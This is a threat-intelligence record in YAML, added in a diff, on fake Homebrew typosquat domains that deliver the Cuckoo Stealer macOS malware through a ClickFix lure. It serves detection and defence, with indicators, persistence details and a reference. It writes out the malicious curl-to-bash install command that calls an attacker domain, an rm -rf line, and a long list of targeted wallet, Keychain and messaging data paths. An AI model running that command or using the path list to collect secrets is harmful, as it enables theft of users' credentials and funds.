@@ -1,0 +1,106 @@
+title: Fake Homebrew Typosquats Used to Deliver Cuckoo Stealer via ClickFix
+description: The malware moves quickly to harvest credentials, establish persistence,
+  encrypt C2 traffic, and systematically collect browser data, wallet files, Keychain
+  contents, messaging sessions, and local documents.
+attribution: ''
+malware_families:
+- Cuckoo Stealer
+cves: []
+ttps:
+  processes:
+  - bash
+  - curl
+  command_lines:
+  - /bin/bash -c "$(curl -fsSL https://raw.homabrews[.]org/Homebrew/install/HEAD/install.sh)"
+  - curl - bash downloads and executes payload
+  - screencapture -x screenshots taken
+  powershell: []
+  scripts:
+  - set volume output muted true
+  - sleep 3; rm -rf '%s'
+  registry_keys:
+  - ~/Library/LaunchAgents/com.homebrew.brewupdater.plist
+  image_loads: []
+  network_connections:
+  - curl -> raw.homabrews[.]org:443
+  - brew_agent -> homabrews[.]org:443
+  - com.homebrew.brewupdater.plist -> homabrews[.]org:443
+  - com.homebrew.brewupdater.plist -> raw.brewsh[.]cx:443
+  - com.homebrew.brewupdater.plist -> braw[.]sh:443
+  - com.homebrew.brewupdater.plist -> brewsh[.]cx:443
+  - com.homebrew.brewupdater.plist -> brew[.]lat:443
+  - com.homebrew.brewupdater.plist -> brew.pages[.]dev:443
+  - curl_easy_setopt(v4, CURLOPT_URL, "https://homabrews.org/brewinstaller")
+  file_activity:
+  - /tmp/brew_agent
+  - ~/.local-{session_id}/BrewUpdater
+  - ~/Library/Keychains/
+  - ~/Library/Containers/org.telegram.desktop/.
+  - ~/Library/Application Support/Bitcoin/wallet.dat
+  - ~/Library/Application Support/Litecoin/wallet.dat
+  - ~/Library/Application Support/Dogecoin/wallet.dat
+  - ~/Library/Application Support/Raven/wallet.dat
+  - ~/Library/Application Support/DashCore/wallets/
+  - ~/Library/Application Support/DigiByte/wallets/
+  - ~/Library/Ethereum/keystore/
+  - ~/.electrum/wallets/
+  - ~/.electrum-ltc/wallets/
+  - ~/.electron-cash/wallets/
+  - ~/.sparrow/wallets/
+  - ~/Monero/wallets/
+  - ~/Library/Application Support/Exodus/exodus.wallet/
+  - ~/Library/Application Support/atomic/Local Storage/
+  - ~/Library/Application Support/Guarda/Local Storage/
+  - ~/Library/Application Support/Jaxx/Local Storage/
+  - ~/Library/Application Support/Coinomi/wallets/
+  - ~/Library/Application Support/MyMonero/*.mmdbdoc_v1
+  - ~/Library/Application Support/Daedalus Mainnet/wallets/
+  - ~/.walletwasabi/client/Wallets/
+  - '~/Library/Application Support/BlockstreamGreen/CopyHardware Wallet Companion
+    Apps:'
+  - ~/Library/Application Support/Ledger Live/app.json
+  - ~/Library/Application Support/@trezor/
+  - ~/Library/Application Support/Specter/
+  - ~/Library/Application Support/Binance/
+  - ~/Library/Containers/com.bitpay.wallet.desktop/
+  - ~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite
+  - ~/Library/LaunchAgents/com.homebrew.brewupdater.plist
+  - ~/Library/Application Support/discord/Local Storage
+  - ~/Library/Application Support/Telegram Desktop/tdata
+  - ~/Library/Application Support/OpenVPN Connect/profiles
+  - ~/Library/Application Support/Exodus/exodus.wallet
+  - ~/Library/Application Support/BlockstreamGreen/
+  - ~/Library/Application Support/Neon/storage/userWallet.json
+  - /Library/Group Containers/group.com.apple.notes/NoteStore.sqlite
+  persistence:
+  - LaunchAgent (com.homebrew.brewupdater.plist) pointing to ~/.local-{session_id}/BrewUpdater
+  - LaunchAgent plist file at ~/Library/LaunchAgents/com.homebrew.brewupdater.plist
+  - LaunchAgent named 'com.homebrew.brewupdater.plist'
+  - Binary located at ~/.local-{session_id}/BrewUpdater
+  - com.homebrew.brewupdater.plist created
+  process_relations: []
+iocs:
+  hashes:
+  - f985cd667c77e7d99c1ac2ea9cb0861ded15e1c2d44e480cbd178ca8b2caae42
+  - 545dd5cba264bf242bc837330ca34247e202f7ac25f03eec63bf5842357519f1
+  ip_addresses:
+  - 5.255.123[.]244
+  domains:
+  - homabrews[.]org
+  - brewsh[.]cx
+  - brrewsh[.]org
+  - brewshh[.]org
+  - bashbuddy-landing.pages[.]dev
+  - brewmacos[.]com
+  - www.nitrogen[.]lol
+  - raw.brewsh[.]cx
+  - braw[.]sh
+  - brew[.]lat
+  - brew.pages[.]dev
+  urls:
+  - hxxps://raw.homabrews[.]org/Homebrew/install/HEAD/install.sh
+  - https://raw.homabrews[.]org/Homebrew/install/HEAD/install.sh
+authors: []
+reference: https://hunt.io/blog/fake-homebrew-clickfix-cuckoo-stealer-macos
+date_of_publication: February 17, 2026
+file_creation_date: May 14, 2026
